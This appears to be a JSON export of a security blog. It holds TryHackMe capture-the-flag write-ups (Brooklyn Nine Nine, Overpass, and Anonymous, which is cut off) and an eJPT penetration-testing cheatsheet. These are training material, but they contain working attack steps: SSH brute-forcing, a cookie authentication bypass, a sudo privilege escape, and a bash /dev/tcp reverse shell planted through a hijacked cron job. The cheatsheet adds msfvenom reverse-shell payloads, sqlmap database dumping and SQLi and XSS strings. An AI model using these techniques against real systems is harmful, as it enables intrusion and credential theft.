[ { "title": "Brooklyn Nine Nine Writeup | TryHackMe", "url": "/posts/brooklyn-nine-nine-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, gobuster, nmap, pentest", "date": "2022-07-20 00:00:00 +0100", "snippet": "OverviewWelcome to my write-up for the Brooklyn Nine Nine room on TryHackMe. Unlike other rooms, this has very little hand-holding, so you must have a good knowledge base and methodology before attempting this room. However, the room is of easy difficulty, so anyone can attempt to hack this box. In preparation, I recommend you consult my other write-ups on Kenobi and Mr Robot.In order to complete this room, we must enumerate the target machine’s FTP server and website, bruteforce SSH credentials using Hydra in order to gain initial access, and escalate our privileges via misconfigured binaries.I hope you enjoy!WalkthroughOnce we have established our connection to the VM, we begin by enumerating the machine by running an nmap scan:$ nmap -sC -sV -T4 -p- 10.10.240.107 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 22:26 BSTNmap scan report for 10.10.240.107Host is up (0.070s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.1.103| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)| 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)|_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 77.06 secondsHere is a quick overview of the above scan: -sC: Will perform a script scan using a set of default scripts. -sV: Will probe open ports to determine service and version information. -T4: Sets the timing for the scan (higher is faster). -p-: Specifies all ports will be scanned (1-65535).From the output, it shows we have 3 ports open on the target machine, namely FTP (21), SSH (22), and HTTP (80).It also appears that anonymous access is enabled on the FTP service on port 21, so we can login:As highlighted, there is a note_to_jake.txt which reads:From Amy,Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nineNow that the FTP server has been enumerated, we can move onto the webserver.It is good practice to manually crawl the website while you run additional scans. In particular, we can run nikto to scan the website for vulnerabilities, and gobuster to check for additional subdirectories, while we check the website in our browser. The output of such scans are as follows:$ nikto -h http://10.10.240.107- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.240.107+ Target Hostname: 10.10.240.107+ Target Port: 80+ Start Time: 2022-07-20 22:44:40 (GMT1)---------------------------------------------------------------------------+ Server: Apache/2.4.29 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Server may leak inodes via ETags, header found with file /, inode: 2ce, size: 5a5ee14bb8d76, mtime: gzip+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD + OSVDB-3233: /icons/README: Apache default file found.+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host+ End Time: 2022-07-20 22:51:12 (GMT1) (392 seconds)---------------------------------------------------------------------------+ 1 host(s) tested$ gobuster dir -u http://10.10.240.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.240.107[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/07/20 22:42:33 Starting gobuster in directory enumeration mode===============================================================/server-status (Status: 403) [Size: 278]Progress: 220512 / 220561 (99.98%) ===============================================================2022/07/20 23:00:01 Finished===============================================================Viewing the source code of the homepage reveals the following comment:We can see if there is any data hidden within the image using steghide:$ wget http://10.10.240.107/brooklyn99.jpg$ steghide info brooklyn99.jpg\"brooklyn99.jpg\": format: jpeg capacity: 3.5 KBTry to get information about embedded data ? (y/n) yEnter passphrase:It appears that there is a .jpeg file embedded within the image, but it requires a passphrase in order to be extracted.From the note_to_jake.txt file on the FTP server, it appears Jake’s password is particularly weak. Therefore, we can hydra to bruteforce his password on the SSH server:With the password, we are now able to login as the jake user via SSH, but we still cannot crack the passphrase for the image.However, there is no user.txt within the jake user’s /home directory. Listing the contents of the /home directory, there appears to be two other users: amy and holt. The user.txt flag is contained within the holt user’s /home directory:Now that we have the user.txt flag we find a way to escalate our privileges to root. Firstly, we can check if we can run any binaries with sudo using the sudo -l command:jake@brookly_nine_nine:~$ sudo -lMatching Defaults entries for jake on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/lessAs shown, we can run the less binary with sudo without any password, meaning we can elevate our privileges to root. To do this, we can consult GTFObins for the less binary. In particular, we can run the following as jake in order to become root and retrieve the root.txt flag:sudo less /etc/profile!/bin/shClosing RemarksAnd that’s it! All done!I hope you all enjoyed this room and learned a thing or two. I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.If you want to keep up-to-date on what I do, follow me here: Twitter GitHubOr you can also support me by buying me a coffee:Stay curious- v3r4x" }, { "title": "Overpass | TryHackMe", "url": "/posts/overpass-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, cron, security, owasp", "date": "2022-07-19 00:00:00 +0100", "snippet": "OverviewWelcome to my writeup for the Overpass room on TryHackMe. As with my recent writeups, these rooms have very little guidance, so you must have a good knowledge base and methodology before attempting. Feel free to explore my other writeups here for guidance on how to tackle similar rooms.In order to complete this room, we must enumerate the target, establish initial access by exploiting a vulnerable web application, and escalate our privileges via a misconfigured cron job.I hope you enjoy!WalkthroughOnce we have established connection with the VM, we begin by enumerating the vulnerable machine with nmap:$ nmap -sC -sV -T4 -p- 10.10.23.164Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 21:25 BSTNmap scan report for 10.10.73.164Host is up (0.058s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)| 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)|_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: OverpassService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 34.36 secondsHere is a quick overview of the above scan: -sC: Will perform a script scan using a set of default scripts. -sV: Will probe open ports to determine service and version information. -T4: Sets the timing for the scan (higher is faster). -p-: Specifies all ports will be scanned (1-65535).From the output, we have two open ports on the target machine, namely . (SSH) and port 80 (HTTP).Given that we can’t connect to the SSH server, we can enumerate the web server running on port 80 using both nikto and gobuster. While these are running, we can navigate to the website on our browser and crawl it manually to better understand how it works.As shown above, the website appears to offer a “secure password manager” for all platforms and supports “military grade cryptography” to keep your passwords safe. We can get a copy of this from the “Downloads” page as shown:From the “About Us” page, it appears that Overpass was formed due to the number of compromised passwords within the rockyou wordlist. It also claims that the passwords are stored locally on your PC and are unique for every service.From our nikto and gobuster scans, we also see an /admin directory.$ nikto -h 10.10.73.164- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.73.164+ Target Hostname: 10.10.73.164+ Target Port: 80+ Start Time: 2022-07-19 21:34:32 (GMT1)---------------------------------------------------------------------------+ Server: No banner retrieved+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3092: /admin.html: This might be interesting...+ OSVDB-3092: /admin/: This might be interesting...+ OSVDB-3092: /css/: This might be interesting...+ OSVDB-3092: /downloads/: This might be interesting...+ OSVDB-3092: /img/: This might be interesting...+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2022-07-19 21:38:53 (GMT1) (261 seconds)---------------------------------------------------------------------------+ 1 host(s) tested$ gobuster dir -u 10.10.73.164 -w /usr/share/wordlists/dirb/common.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.73.164[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/07/19 21:35:06 Starting gobuster in directory enumeration mode===============================================================/aboutus (Status: 301) [Size: 0] [--&gt; aboutus/]/admin (Status: 301) [Size: 42] [--&gt; /admin/]/css (Status: 301) [Size: 0] [--&gt; css/] /downloads (Status: 301) [Size: 0] [--&gt; downloads/]/img (Status: 301) [Size: 0] [--&gt; img/] /index.html (Status: 301) [Size: 0] [--&gt; ./] ===============================================================2022/07/19 21:35:28 Finished===============================================================Unfortunately, we do not have any usernames, so we cannot bruteforce any passwords. Looking at the source code, there appears to be three JavaScript files being referenced within the HTML:The login.js appears to handle the logic for the /admin login form.function onLoad() { document.querySelector(\"#loginForm\").addEventListener(\"submit\", function (event) { //on pressing enter event.preventDefault() login() });}async function login() { const usernameBox = document.querySelector(\"#username\"); const passwordBox = document.querySelector(\"#password\"); const loginStatus = document.querySelector(\"#loginStatus\"); loginStatus.textContent = \"\" const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\"/api/login\", creds) const statusOrCookie = await response.text() if (statusOrCookie === \"Incorrect credentials\") { loginStatus.textContent = \"Incorrect Credentials\" passwordBox.value=\"\" } else { Cookies.set(\"SessionToken\",statusOrCookie) window.location = \"/admin\" }}As the above shows, the onLoad() function is called as soon as the page is loaded. It then waits for the form #loginForm to be submitted before calling the login() function. After retrieving the submiitted form values, the function then creates a POST request to the /api/login endpoint and receives a response. If the response is equal to “Incorrect credentials”, the login was unsuccessful and the form is reset, otherwise a cookie called SessionToken is created with the value of the response.We can therefore abuse the if-statement and create a cookie called SessionToken with any value other than “Incorrect credentials”. We can use an in-built cookie editor for this.Here we create a cookie called SessionToken, as above, and give it a value of “lorem ipsum…”. Again, the value is not important - it just has to be different than “Incorrect credentials”. After clicking the save button we can then refresh the page and establish our access to the admin page.As shown above, we have been given a private key which is used for James’ SSH access. Subsequently, we can copy this and create our own key and access the machine via SSH as James. To do this, we first need to copy the key to a file:Note that it is vital to leaving a trailing newline at the end of the file or else SSH will not recognise it as a private key. We then have to set the permissions of the file so that it can be used appropriately. To do this, we use the chmod command (change mode) with 600 to alter the permissions of the file. Specifically, this will allow the owner of the file to read and write to it but not execute it.$ chmod 600 jamesWe can then login via SSH. However, as shown below, we require a password for the key before we can successfully login.We can retrieve this password by utilising JohnTheRipper. Firstly, we have to convert the file to a hash that JohnTheRipper can use - we do this using ssh2john.py. Then, we can run the john command with the rockyou.txt wordlist against our hash.txt file:Now that we have the password for the SSH key, we can successfully login as james and retrieve our user flag:We also have a todo.txt file within the james user’s /home directory which reads:To Do:&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough&gt; Write down my password somewhere on a sticky note so that I don't forget it. Wait, we make a password manager. Why don't I just use that?&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works&gt; Ask Paradox how he got the automated build script working and where the builds go. They're not updating on the websiteFrom the second note, it appears James has used the Overpass password manager to make a note of his password. Taking a look at the source code retrieved from the “Downloads” page, it appears that the password manager uses ROT47 - a variant of the Caesar Cipher - to encrypt the passwords.//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-examplefunc rot47(input string) string { var result []string for i := range input[:len(input)] { j := int(input[i]) if (j &gt;= 33) &amp;&amp; (j &lt;= 126) { result = append(result, string(rune(33+((j+14)%94)))) } else { result = append(result, string(input[i])) } } return strings.Join(result, \"\")}Once the password is encrypted, it is saved to a .overpass file within the user’s /home directory. Since we now know the encryption method, we can decode his password:Now that we have established ourselves as the james user, we must find a way to escalate our privileges to root and find the final flag. As such, we must conduct further enumeration. To do this, we can use linPEAS which is part of the Privilege Escalation Awesome Scripts Suite. Firstly, we need to upload the linpeas.sh script to the victim machine - we can do this with Python.$ lslinpeas.sh winPEAS.bat$ sudo python3 -m http.server 80We can then retrieve the linpeas.sh file from the victim machine:Running linpeas.sh reveals a cronjob running as root:In particular, the cronjob is executing the buildscript.sh with bash after retrieving it from overpass.thm using curl:GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.goecho \"$(date -R) Builds completed\" &gt;&gt; /root/buildStatusAs shown above, this file first builds the Overpass password manager witin /src/. It then echos the current date and “Builds completed”, appending it to /root/buildStatus.More importantly, linpeas.sh also indicated that we can edit /etc/hosts, and thus we can change the overpass.thm endpoint to point to our attacker machine.We can then create a buildscript.sh file on our machine with a reverse shell one-liner:bash -i &gt;&amp; /dev/tcp/10.8.1.103/4444 0&gt;&amp;1Note that this file has to be placed within a downloads/src/ directory, otherwise the cronjob will not be able to find and fetch the file. We also require a Python HTTP server, which allows the cronjob to fetch the file and a netcat listener to catch the callback when the file is executed:As shown, we receive a GET request for the buildscript.sh script. We then see the callback on our netcat listener and establish our connection as the root user. Finally, since we have successfully escalated our privileges, we can retrieve the root flag:Closing RemarksAnd that’s it! All done!I hope you all enjoyed this room and learned a thing or two. I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.If you want to keep up-to-date on what I do, follow me here: Twitter GitHubOr you can also support me by buying me a coffee:Stay curious- v3r4x" }, { "title": "eJPT Cheatsheet", "url": "/posts/ejpt-cheatsheet/", "categories": "Certifications, Cheatsheet", "tags": "certifications, cheatsheet, ejpt", "date": "2022-07-01 12:30:00 +0100", "snippet": "OverviewWelcome to my cheatsheet notes for the eLearnSecurity Junior Penetration Tester (eJPT) certification. While I recommend you use these notes, you are also encouraged to make your own as you go through the INE Penetration Testing Student (PTS) course - this will greatly improve your understanding of the concepts and practices taught throughout the course. For effective notetaking, I would highly recommend Obsidian. I have only started to use this recently and it has completely change the way I write notes and dramatically increased my productivity.Furthermore, I would also encourage you to seek out other content creators to improve your skillset, some of which are linked below. Please note, this is not necessary to pass the eJPT exam or to study the course, these are purely recommendations for future study. John Hammond - incredibly in-depth CTF tutorials, malware analysis, and interviews with infosec professionals, etc. TheCyberMentor - outstanding course material for beginners (linux fundamentals, penetration testing, OSINT, privilege escalation, etc.). David Bombal - insightful interviews with infosec professionals and networking tutorials. NetworkChuck - great beginner tutorials on everything from Python to networking, plus some portfolio projects. ippsec - mainly video writeups on HackTheBox machines but with incredibly high-quality explanations. CryptoCat - vast array of video write-ups for CTF challenges suitable for all skill levels.Before continuing, it is worth mentioning that my notes do not contain details about the labs or the exam - for obvious reasons. In addition, INE update their courses fairly frequently so some of the information may be outdated after this is published. I will do my utmost to update them, but I am not planning on a complete overhaul should the course be changed significantly. Finally, these notes are also available on my Github if you want to create your own copy.I am very much a “quality over quantity” person, so the content I produce often takes a long time to create. If you like this or found it useful, buy me a coffee:If you want to keep up-to-date on what I get up to, follow me here: Twitter GitHubI hope you put these notes to good use!eJPT NotesThe layout of this document follows a logical order from enumeration to exploitation. Steps should be repeated where necessary.Common PortsTCP Port Service 21 FTP 22 SSH 23 Telnet 25 SMTP 53 DNS 80 HTTP 110 POP3 139 + 445 SMB 143 IMAP 443 HTTPS UDP Port Service 53 DNS 67 DHCP 68 DHCP 69 TFTP 161 SNMP Other Useful Ports Port Service 1433 MS SQL Server 3389 RDP 3306 MySQL Scanning and EnumerationEstablish your IP with ifconfigUse ifconfig to establish your IP. For example:$ ifconfigtap0: flags-4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.193.70 netmask 255.255.255.0 broadcast 0.0.0.0 inet6 fe80::c8f:29ff:feb4:5219 prefixlen 64 scopeid 0x20&lt;link&gt; ether 0e:8f:29:b4:52:19 txqueuelen 1000 (Ethernet) RX packets 14 bytes 1541 (1.5 KiB) RX errors 0 dropped 4 overruns 0 frame 0 TX packets 9 bytes 754 (754.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Ping Sweeps using fping$ fping -a -g IPRANGE -a only shows alive hosts -g performs a ping sweep instead of a normal pingFor example:$ fping -a -g 192.168.32.0/24OR$ fping -a -g 192.168.82.0 192.168.82.255You can also suppress warnings by directing the process standard error to /dev/null:$ fping -a -g 192.168.32.0/24 2&gt;/dev/nullOR$ fping -a -g 192.168.82.0 192.168.82.255 2&gt;/dev/nullCombining fping with nmapUsing fping to discover hosts and directing it to an output file ips.txt:$ fping -a -g IPRANGE 2&gt;/dev/null &gt; ips.txtThen, use nmap to conduct a ping scan:$ nmap -sn -iL ips.txtHost Discovery with nmapPerform a ping scan using -sn:$ nmap -sn IPRANGEFor example:$ nmap -sn 200.200.0.0/16$ nmap -sn 200.200.123.1-12$ nmap -sn 172.16.12.*$ nmap -sn 200.200.12-13.*You can also load files from an input list using -iL:$ nmap -sn -iL FILENAME.EXTENSIONFor example, a file named hostlist.txt contains the following:192.168.32.0/24172.16.12.*200.200.123.1-12The nmap command would then become:$ nmap -sn -iL hostlist.txtEnumeration with nmapFor each host on a network, you can run the following to enumerate it:$ nmap -p- -Pn -sC -sV &lt;IP address&gt; -p- scans all ports -Pn assumes all ports are open -sC performs a script scan -sV performs a version detection scanFor example:# Full port enumeration outputted to file$ nmap -p- -Pn -sC -sV 192.168.1.24 -oN initial_scan# First 1000 ports$ nmap -p 1-1000 192.168.1.24# Service detection scan on /24 network$ nmap -sV 10.11.12.0/24# TCP connect scan on two targets$ nmap -sT 192.168.12.33,34# Full scan (all ports, syn/script/version scan)$ nmap -Pn -T4 --open -sS -sC -sV --min-rate-1000 --max-retries-3 -p- -oN output_file 10.10.10.2Shares EnumerationUsing smbclientList shares:$ smbclient -L //&lt;IP ADDRESS&gt;/ -NMount share:$ smbclient //&lt;IP ADDRESS&gt;/&lt;SHARE&gt;Using enum4linux$ enum4linux -a &lt;IP ADDRESS&gt;Using nmblookup$ nmblookup -A &lt;IP ADDRESS&gt;Using nmap$ nmap --script smb-vuln* -p &lt;PORT&gt; &lt;IP ADDRESS&gt;Banner GrabbingUsing netcat$ nc -nv &lt;IP Address&gt; &lt;Port&gt;For example:$ nc -nv 192.168.1.24 80Using openssl (HTTPS)$ openssl s_client -connect &lt;IP ADDRESS&gt;:443Common Wireshark Filters Description Syntax Example Filter by IP ip.add -- IP ADDRESS ip.add -- 192.168.1.28 Filter by Destination IP ip.dest -- IP ADDRESS ip.add -- 192.168.1.28 Filter by Source IP ip.src -- IP ADDRESS ip.add -- 192.168.1.72 Filter by Port tcp.port -- PORT tcp.port -- 80 Filter by IP Address and Port ip.addr -- IP ADDRESS and tcp.port -- PORT ip.addr -- 10.9.0.1 and tcp.port -- 80 Filter by Request (HTTP/HTTPS) request.method -- METHOD request.method -- \"POST\" or request.method -- \"GET\" Web EnumerationDirectory Fuzzing with gobuster$ gobuster dir -u &lt;URL&gt; -w &lt;WORDLIST&gt;For example:# Directory scan against one target using medium wordlist$ gobuster dir -u http://192.168.1.32 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt# Directory scan against specific directory using custom wordlist$ gobuster dir -u http://192.168.5.24/confidential -w custom_wordlist.txt# Directory scan with authentication$ gobuster dir -u http://192.168.4.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U adminDirectory Fuzzing with dirb$ dirb &lt;URL&gt; &lt;WORDLIST&gt;For example:# Directory scan against one target$ dirb http://192.168.1.72/ /usr/share/wordlists/dirb/common.txt# Directory scan with authentication$ dirb http://192.168.1.85/ -u \"username:password\" /usr/share/wordlists/dirb/common.txtEnumeration with nikto$ nikto -h URLFor example:$ nikto -h http://192.168.1.10/whois$ whois &lt;URL&gt;Routing and PivotingClear Routing TableTo completely clear the routing table, run the following:$ route -nUse this when setting up a route to make the destination and gateway more clearShow Routing TableOn Windows (and Linux), you can use arp -a:$ arp -aAnd, on Linux, you can use ip route:$ ip routeSetting up a Route with iproute$ ip route add &lt;Network To Access&gt; via &lt;Gateway Address&gt;For example:$ ip route add 192.168.1.0/24 via 10.10.22.1This adds a route to the 192.168.1.0/24 network via the 10.10.22.1 router.ExploitationWeb ExploitationManual SQL Injection (SQLi) Description Injection Basic union xx' UNION SELECT null; -- - Basic bypass ' or 1-1; -- - Automated Exploitation with sqlmap$ sqlmap -u &lt;URL&gt; -p &lt;PARAMETER&gt; [options] For example:# Display all tables in the database$ sqlmap -u http://10.10.0.1/index.php?id-47 --tables# Enumerate the id parameter using the union technique$ sqlmap -u 'http://192.168.1.72/index.php?id-10' -p id --technique-U# Dump database contents$ sqlmap -u 'http://192.162.5.51/index.php?id-203' --dump# Prompt for interactive OS shell$ sqlmap -u 'http://192.168.1.17/index.php?id-1' -os-shellCross-Site Scripting (XSS)Test inputs against XSS using:&lt;script&gt;alert(\"XSS\")&lt;/script&gt;Host ExploitationarpspoofFirst, tell your machine to forward packets to the destination host$ echo 1 &gt; /proc/sys/net/ipv4/ip_forwardThen, run arpspoof:$ arpspoof -i &lt;INTERFACE&gt; -t &lt;TARGET&gt; -r &lt;HOST&gt;For example:$ arpspoof -i tap0 -t 10.10.5.1 -r 10.10.5.7Basic Metasploit UsageLaunch Metasploit by running:$ msfconsoleBasic commands:# Search for exploitmsf5 &gt; search apache# Use exploit (by number)msf5 &gt; use 1# Use exploit (by name)msf5 &gt; use exploit/multi/handler# Set parametermsf5 &gt; set payload windows/x64/meterpreter/reverse_tcp# Show parameters and other optionsmsf5 &gt; show optionsFor example, to configure a listener for a reverse shell:$ msfconsole$ use exploit/multi/handler$ set payload &lt;REVERSE SHELL PAYLOAD&gt;$ set LHOST &lt;LISTENER IP&gt;$ set LPORT &lt;LISTENER PORT&gt;$ exploitGenerate Payload Using msfvenomStandard PHP reverse shell:$ msfvenom -p php/reverse_php LHOST=&lt;LISTENER IP&gt; LPORT=&lt;LISTENER PORT&gt; -o &lt;OUTPUT FILE NAME&gt;Windows reverse shell:$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LISTENER IP&gt; LPORT=&lt;LISTENER PORT&gt; -f dll &gt; shell.dllLinux reverse shell:$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;LISTENER IP&gt; LPORT=&lt;LISTENER PORT&gt; -f elf &gt; shell.elfMeterpreter Shell Commands# background current sessionmeterpreter &gt; background# list current open sessionsmeterpreter &gt; session -l# open sessionmeterpreter &gt; session -i &lt;SESSION NUMBER&gt;# privilege escalation (Windows)meterpreter &gt; getsystem# list system informationmeterpreter &gt; sysinfo/route/getuid# dump Windows hashesmeterpreter &gt; hashdump# upload file to systemmeterpreter &gt; download &lt;FILE NAME&gt; /path/to/directoryListener with netcat$ nc -nvlp PORT n: IP addresses only (no DNS) v: verbose mode (-vv for very verbose) l: listen for incoming connections p: local port to listen onFor example:$ nc -nvlp 4444Stabilise a ShellSpawn an interactive terminal via Python:# First check if the system has Python$ which python/usr/bin/python# Then, spawn a Python shell using pty$ python -c \"import pty; pty.spawn('/bin/bash')\"# Finally, export XTERM (allows you to clear terminal)$ export TERM=xtermNOTE: this works the same with python3.Bruteforcinghydra$ hydra -L &lt;LIST OF USERNAMES&gt; -P &lt;LIST OF PASSWORDS&gt; &lt;TARGET&gt; &lt;SERVICE&gt; -s &lt;PORT&gt;OR$ hydra -l &lt;USERNAME&gt; -P &lt;LIST OF PASSWORDS&gt; -t &lt;TARGET&gt; &lt;SERVICE&gt; -s &lt;PORT&gt;# Bruteforce SSH$ hydra -L users.txt -P pass.txt 10.10.10.2 ssh -s 22 $ hydra -L users.txt -P pass.txt ssh://10.10.10.2# Bruteforce FTP$ hydra -l admin -P passwords.txt 192.168.1.4 ftp -s 21$ hydra -l admin -P passwords.txt ftp://192.168.1.4John The Ripper (john)First, prepare a file for john to crack:$ unshadow passwd shadow &gt; hashCrack the passwords:$ john --wordlist=/usr/share/wordlists/rockyou.txt hashOther cheatsheets: Hydra: https://github.com/frizb/Hydra-Cheatsheet GTFOBins: https://gtfobins.github.io/" }, { "title": "Anonymous Writeup | TryHackMe", "url": "/posts/anonymous-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, smb, ftp, suid, cron", "date": "2022-06-30 00:00:00 +0100", "snippet": "OverviewWelcome to my write-up for the Anonymous room on TryHackMe. Unlike other rooms, this has very little hand-holding, so you must have a good knowledge base and methodology before attempting this room. As such, I recommend you consult my other write-ups on Kenobi and Mr Robot.In order to complete this room, we must enumerate the target machine’s FTP server and SMB (Server Message Block) shares, gain access by manipulating a scheduled shell script, and escalate our privileges via SUID bits to retrieve our flags.I hope you enjoy!WalkthroughOnce we have established our connection to the VM, we begin by enumerating the machine by running an nmap scan:$ nmap -sC -sV -T4 -p- 10.10.127.27Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 13:19 BSTNmap scan report for 10.10.127.27Host is up (0.050s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.1.103| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)| 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)|_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -2s, deviation: 1s, median: -2s| smb2-time: | date: 2022-06-30T12:19:58|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: anonymous| NetBIOS computer name: ANONYMOUS\\x00| Domain name: \\x00| FQDN: anonymous|_ System time: 2022-06-30T12:19:57+00:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 50.47 secondsHere is a quick overview of the above scan: -sC: Will perform a script scan using a set of default scripts. -sV: Will probe open ports to determine service and version information. -T4: Sets the timing for the scan (higher is faster). -p-: Specifies all ports will be scanned (1-65535).From the output, it shows we have 4 ports open on the target machine, namely II, SSH (22), and SMB (139 and 445).It also appears that anonymous access is enabled on the FTP service on port 21, so we can login:$ ftp 10.10.127.27Connected to 10.10.127.27.220 NamelessOne's FTP Server!Name (10.10.127.27:v3r4x): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||41672|)150 Here comes the directory listing.drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts226 Directory send OK.ftp&gt; cd scripts250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||20695|)150 Here comes the directory listing.-rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh-rw-rw-r-- 1 1000 1000 1462 Jun 30 12:28 